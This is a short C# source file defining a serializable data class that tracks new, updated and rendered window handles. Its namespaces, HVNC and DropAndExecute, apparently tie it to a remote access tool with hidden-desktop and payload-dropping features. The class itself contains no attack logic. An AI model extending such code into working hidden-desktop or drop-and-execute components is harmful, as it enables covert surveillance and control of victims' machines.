using System;
using System.Collections.Generic;
using Orcus.Shared.Commands.HVNC;

namespace Orcus.Shared.Commands.DropAndExecute
{
    [Serializable]
    public class WindowUpdate
    {
        public WindowUpdate()
        {
            NewWindows = new List<WindowInformation>();
            AllWindows = new List<Int64>();
            UpdatedWindows = new List<WindowInformation>();
        }

        public List<WindowInformation> NewWindows { get; set; }
        public List<WindowInformation> UpdatedWindows { get; set; }
        public List<Int64> AllWindows { get; set; }

        public Int64 RenderedWindowHandle { get; set; }
    }
}